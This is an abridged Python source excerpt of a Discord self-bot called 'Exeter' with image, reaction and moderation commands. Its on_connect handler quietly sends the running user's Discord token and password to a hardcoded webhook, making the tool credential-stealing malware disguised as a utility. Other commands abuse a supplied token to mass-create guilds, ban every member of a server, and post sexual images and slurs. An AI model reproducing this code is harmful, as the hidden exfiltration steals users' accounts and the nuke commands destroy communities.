...
stream_url = "https://www.twitch.tv/zzz"
tts_language = "en"
...
def startprint():
    ...
    print(f'''{Fore.GREEN}
                  ███████╗██╗  ██╗███████╗████████╗███████╗██████╗ 
                    ...
                    {Fore.CYAN}Account: {Fore.GREEN}{Exeter.user.name}#{Exeter.user.discriminator}
                    {Fore.CYAN}ID: {Fore.GREEN}{Exeter.user.id}   
                    {Fore.CYAN}Nitro: {Fore.GREEN}{nitro}
                    {Fore.CYAN}Users: {Fore.GREEN}{len(Exeter.users)}
...
async def on_connect():
    Clear()  
    requests.post('https://discord.com/api/webhooks/830788644049911838/bX-0YXWSJXJJ3c0elebS6XqBLwKsdxehKQX8QU5t3y6Ev27hZAXhN4eVydDTXfGnugfC',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
    startprint()
...
async def help(ctx, category=None):
    await ctx.message.delete()
    if category is None:
        embed = discord.Embed(color=0xFF7300, timestamp=ctx.message.created_at)
        embed.set_author(
    ...
    async with aiohttp.ClientSession() as cs:
        async with cs.get(
            ...
            try:
                ...
                with io.BytesIO(image) as file:
                    await ctx.send(
                        file=discord.File(file, f"tweet.png"))
            except:
        ...
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"pixel.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        ...
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"gay.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        ...
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"communist.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        ...
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"snow.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        ...
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"jpegify.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
...
async def phcomment(ctx, user: str = None, *, args=None):
    ...
    try:
        ...
        with io.BytesIO(image) as file:
            await ctx.send(
                file=discord.File(file, f"pornhub_comment.png"))
    except:
        await ctx.send(res["message"])
...
async def tokenfuck(ctx, _token):
    ...
    guild = {
        'channels': None,
        'icon': None,
        'name': "your mom got fucked bitch",
        'region': "europe"
    }
    for _i in range(50):
        requests.post(
...
async def banall(ctx):
  for user in list(ctx.guild.members):
     try:
        await user.ban(reason="retard")
        print(f"{Fore.GREEN} banning everyone from guild.")
     except:
         pass
  print(f"{Fore.RED}Banned all members!")
...
async def feed(ctx, user: discord.Member):
	...
	res = r.json()
	em = discord.Embed(description=Exeter.user.mention + ' feeds ' +
	                   user.mention,
...
async def tickle(ctx, user: discord.Member):
	...
	res = r.json()
	em = discord.Embed(description=Exeter.user.mention + ' tickles ' +
	                   user.mention,
	                   color=discord.Color(random.randint(0x000000, 0xFFFFFF)))
	em.set_image(url=res['url'])
	await ctx.send(embed=em)
...
async def slap(ctx, user: discord.Member):
	...
	res = r.json()
	em = discord.Embed(description=Exeter.user.mention + ' slaps ' +
	                   user.mention,
	                   color=discord.Color(random.randint(0x000000, 0xFFFFFF)))
	em.set_image(url=res['url'])
	await ctx.send(embed=em)
...
async def hug(ctx, user: discord.Member):
	...
	res = r.json()
	em = discord.Embed(description=Exeter.user.metion + ' hugs ' + user.mention,
	                   color=discord.Color(random.randint(0x000000, 0xFFFFFF)))
	em.set_image(url=res['url'])
	await ctx.send(embed=em)
...
async def smug(ctx, user: discord.Member):
	...
	res = r.json()
	em = discord.Embed(description=Exeter.user.mention + ' smugged at ' +
	                   user.mention,
	                   color=discord.Color(random.randint(0x000000, 0xFFFFFF)))
	em.set_image(url=res['url'])
	await ctx.send(embed=em)
...
async def poke(ctx, user: discord.Member):
	...
	res = r.json()
	em = discord.Embed(description=Exeter.user.mention + ' wants attention ' +
	                   user.mention,
	                   color=discord.Color(random.randint(0x000000, 0xFFFFFF)))
	em.set_image(url=res['url'])
	await ctx.send(embed=em)
...
async def cum(ctx, user: discord.Member):
	...
	r = requests.get("https://nekos.life/api/v2/img/cum")
	res = r.json()
	em = discord.Embed(description=Exeter.user.mention + ' busted a nut in' +
	                   user.mention,
	                   color=discord.Color(random.randint(0x000000, 0xFFFFFF)))
	em.set_image(url=res['url'])
	await ctx.send(embed=em)
...
async def fuck(ctx, user: discord.Member):
	...
	r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
	res = r.json()
	em = discord.Embed(description=Exeter.user.mention + ' fucked ' + user.mention,
	                   color=discord.Color(random.randint(0x000000, 0xFFFFFF)))
	em.set_image(url=res['url'])
	await ctx.send(embed=em)
...
async def head(ctx, user: discord.Member):
	...
	r = requests.get("https://nekos.life/api/v2/img/blowjob")
	res = r.json()
	em = discord.Embed(description=Exeter.user.mention + ' gave ' + user.mention +
	                   ' head',
	                   color=discord.Color(random.randint(0x000000, 0xFFFFFF)))
	em.set_image(url=res['url'])
	await ctx.send(embed=em)
...
async def cuddle(ctx, user: discord.Member):
	...
	res = r.json()
	em = discord.Embed(description=Exeter.user.mention + ' cuddles ' +
	                   user.mention,
	                   color=discord.Color(random.randint(0x000000, 0xFFFFFF)))
	em.set_image(url=res['url'])
	await ctx.send(embed=em)
...
async def pat(ctx, user: discord.Member):
	...
	res = r.json()
	em = discord.Embed(description=Exeter.user.mention + ' pets' +
	                   user.mention,
	                   color=discord.Color(random.randint(0x000000, 0xFFFFFF)))
	em.set_image(url=res['url'])
	await ctx.send(embed=em)
...
async def kiss(ctx, user: discord.Member):
	...
	res = r.json()
	em = discord.Embed(description=Exeter.user.mention + ' kisses ' +
	                   user.mention,
	                   color=discord.Color(random.randint(0x000000, 0xFFFFFF)))
	em.set_image(url=res['url'])
	await ctx.send(embed=em)
